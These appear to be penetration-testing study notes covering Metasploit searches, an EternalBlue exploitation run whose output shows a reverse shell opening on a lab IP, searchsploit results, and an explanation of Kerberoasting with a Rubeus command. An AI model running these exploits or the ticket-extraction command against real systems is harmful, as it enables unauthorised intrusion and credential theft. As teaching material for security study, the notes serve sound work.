## Table of Contents

    - [Kerberoasting](#Kerberoasting)
      - [Kerberos](#Kerberos)
        - [Kerberoasting attacks](#Kerberoasting\attacks)

When it comes to the MITRE ATT&CK Framework, the topics covered in this section fall under Execution and Persistence

Exploitation/system compromise, serve two purposes for us. One of them is to demonstrate that vulnerabilities are legitimate and not just theoretical. 


We could narrow the scope with some additional parameters, like specifying the type using `type:exploit`, for example. This may be useful if you have a long list of results and you need to make it easier to identify the right one.  
  
**Searching Metasploit**  
  `msf6> search eternalblue`

**Eternal Blue Exploit**  
  
```bash
Msf6> use exploit/windows/smb/ms17_010_eternalblue  
msf exploit(windows/smb/ms17_010_eternalblue)> set RHOST 192.168.86.24  
RHOST => 192.168.86.24  
msf exploit(windows/smb/ms17_010_eternalblue)> exploit  
  
[*] Started reverse TCP handler on 192.168.86.57:4444  
[*] 192.168.86.24:445 - Connecting to target for exploitation.  
[+] 192.168.86.24:445 - Connection established for exploitation.  
[+] 192.168.86.24:445 - Target OS selected valid for OS indicated by SMB reply  
[*] 192.168.86.24:445 - CORE raw buffer dump (51 bytes)  
[*] 192.168.86.24:445 - 0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 Windows Server 2  
[*] 192.168.86.24:445 - 0x00000010 30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20 008 R2 Standard  
[*] 192.168.86.24:445 - 0x00000020 37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 7601 Service Pac  
[*] 192.168.86.24:445 - 0x00000030 6b 20 31 k 1  
[+] 192.168.86.24:445 - Target arch selected valid for arch indicated by DCE/RPC reply  
[*] 192.168.86.24:445 - Trying exploit with 12 Groom Allocations.  
[*] 192.168.86.24:445 - Sending all but last fragment of exploit packet  
[*] 192.168.86.24:445 - Starting non-paged pool grooming  
[+] 192.168.86.24:445 - Sending SMBv2 buffers  
[+] 192.168.86.24:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.  
[*] 192.168.86.24:445 - Sending final SMBv2 buffers.  
[*] 192.168.86.24:445 - Sending last fragment of exploit packet!  
[*] 192.168.86.24:445 - Receiving response from exploit packet  
[+] 192.168.86.24:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!  
[*] 192.168.86.24:445 - Sending egg to corrupted connection.  
[*] 192.168.86.24:445 - Triggering free of corrupted buffer.  
[*] Command shell session 1 opened (192.168.86.57:4444 -> 192.168.86.24:50371) at 2023-01-09 19:52:40 -0600  
[+] 192.168.86.24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==  
[+] 192.168.86.24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-==-=  
[+] 192.168.86.24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=
```


**searchsploit Results for Eternal Blue**  
  
```
kilroy@quiche:~$ searchsploit "eternal blue"  
--------------------------------------- --------------------------------------  
Exploit Title                        |  Path  
                                      | (/usr/share/exploitdb/)  
--------------------------------------- --------------------------------------  
Microsoft Windows Windows 7/2008 R2 (x | exploits/windows_x86-64/remote/42031.py  
Microsoft Windows Windows 7/8.1/2008 R | exploits/windows/remote/42315.py  
Microsoft Windows Windows 8/8.1/2012 R | exploits/windows_x86-64/remote/42030.py  
--------------------------------------- --------------------------------------  
Shellcodes: No Result
```



### Kerberoasting
- Type of password cracking attack that relies on getting access to a network.
- Based on the fact that Active Directory authentiation over a network uses the **Kerberos** protocol.

#### Kerberos
- Client-Server mode
- Client Authentication - Authentication Server (AS)
- Client service authentication
- Client making a service request

**KDC**:  Key Distribution Center
**TGS**: Ticket-Granting Service; issues time-stamped messages called *ticket-granting-tickets* (**TGTs**) that are encrypted using the TGS's secret key. The time stamp and encrypted message help to protect the overall design as these tickets shouldn't be spoofed since they require the encryption key that belongs to the TGS. Additionally, as they are time-stamped, they can help protect against replay attacks, where a message gets put onto the network that was previously captured in order to get access to a service protect by kerberos
![[Pasted image 20240226185530.png]]

##### Kerberoasting attacks
- MUST have a compromised account on the domain. The compromised user account will receive service account that is part of the AD design. The attacker, who has control of the compromised user account, wants to compromise a service on the network. They'll request a service ticket for that service. A domain controller with the Active Directory infrastructure will create a TGS ticket, encrypting it with the service password retrieved from the AD database. Only two entities that have the password that could decrypt the message at this point are the domain controller and the service itself.
- The domain controller sends the ticket to the user, which is under control of an attacker. The ticket gets sent to the service, which decrypts it to determine whether the user has been granted permission to the service. This ticket is in memory and can be extracted soi it can then be cracked offline.
- **Rubeus** is a popular tool for performing kerberoasting attacks against windows domains. 
Example Kerberoasting attack:
```powershell
 .\rubeus.exe kerberoast /user:bogus/domain:washere.local /dc:192.168.4.218
```

